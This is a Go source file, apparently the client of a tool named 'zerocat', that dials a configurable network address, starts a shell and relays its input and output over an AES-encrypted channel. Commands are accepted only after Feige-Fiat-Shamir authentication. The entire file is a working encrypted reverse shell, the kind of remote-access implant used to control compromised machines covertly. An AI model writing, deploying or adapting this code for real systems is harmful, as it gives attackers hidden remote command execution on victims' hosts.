//go:build public
// +build public

//go:generate go run ../key-gen/key_gen_ffs.go --public --path ../../keys/auth.keys

package main

import (
	"bytes"
	"encoding/base64"
	"flag"
	"math/big"
	"net"
	"os/exec"

	"example.com/zerocat/pkg/auth"
	gt "example.com/zerocat/pkg/auth/group-theory"
	"example.com/zerocat/pkg/comm"
	"example.com/zerocat/pkg/enc"
)

const (
	buffer_size int = 512
)

var (
	public_key []*big.Int
	master_key []byte
	ring       *gt.ModRing
	group      *gt.CompositeMulGroup
	challenger *auth.ChainChallenger
	verifier   *auth.FFSVerifier
)

func init() {
	public_bytes, err := base64.StdEncoding.DecodeString(public)

	if err != nil {
		panic(err)
	}

	public_key = make([]*big.Int, k)

	for i := 0; i < len(public_key); i++ {
		public_key[i] = big.NewInt(0)
		public_key[i].SetBytes(public_bytes[i*(size/8) : (i+1)*(size/8)])
	}

	master_key, err = base64.StdEncoding.DecodeString(master)

	modulus_bytes, err := base64.StdEncoding.DecodeString(modulus)

	if err != nil {
		panic(err)
	}

	modulus_big := big.NewInt(0)
	modulus_big.SetBytes(modulus_bytes)

	challenger = auth.NewChainChallenger()
	verifier = auth.SetupFFSVerifier(public_key, challenger, modulus_big)
}

func main() {

	command := flag.String("command", "sh", "command to use to start up shell")
	network := flag.String("network", "tcp", "network protocol to use")
	address := flag.String("address", "127.0.0.1:9000", "the address to dial up")

	flag.Parse()

	connection, err := net.Dial(*network, *address)

	if err != nil {
		panic(err)
	}

	defer connection.Close()

	send := make(chan []byte)
	recieve := make(chan []byte)

	deriver := enc.NewSha256Deriver(master_key)
	encapsulator := enc.NewAESEncapsulator(deriver)

	decryption_wrapper := comm.NewDecryptionWrapper(encapsulator, connection, 12, 32)

	encapsulation_buffer := new(bytes.Buffer)
	encapsulation_wrapper := comm.NewEncapsulationWrapper(encapsulator, encapsulation_buffer)
	// handle shell here

	go reverseProof(*command, send, recieve)

	go func() {
		for {
			data, err := decryption_wrapper.Wrap()

			if err != nil {
				panic(err)
			}

			recieve <- data
		}
	}()

	for {
		select {
		case outbound := <-send:
			encapsulation_buffer.Write(outbound)
			data, err := encapsulation_wrapper.Wrap()

			if err != nil {
				panic(err)
			}

			connection.Write(data)
		}
	}
}

func reverseProof(command string, send chan []byte, recieve chan []byte) {
	cmd := exec.Command(command)

	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()

	output_buffer := new(bytes.Buffer)
	output_wrapper := comm.NewFFSOutputWrapper(verifier, output_buffer)

	go func() {
		for {
			select {
			case inbound := <-recieve:
				output_buffer.Write(inbound)
				data, err := output_wrapper.Wrap()

				if err != nil {
					panic(err)
				}

				if data[0] == 1 {
					challenger.Update(data[1:])
					stdin.Write(data[1:])
				}
			}
		}
	}()

	go func() {
		for {
			buffer := make([]byte, buffer_size)
			n, _ := stderr.Read(buffer)
			send <- buffer[:n]
		}
	}()

	cmd.Start()

	for {
		buffer := make([]byte, buffer_size)
		n, _ := stdout.Read(buffer)
		send <- buffer[:n]
	}
}
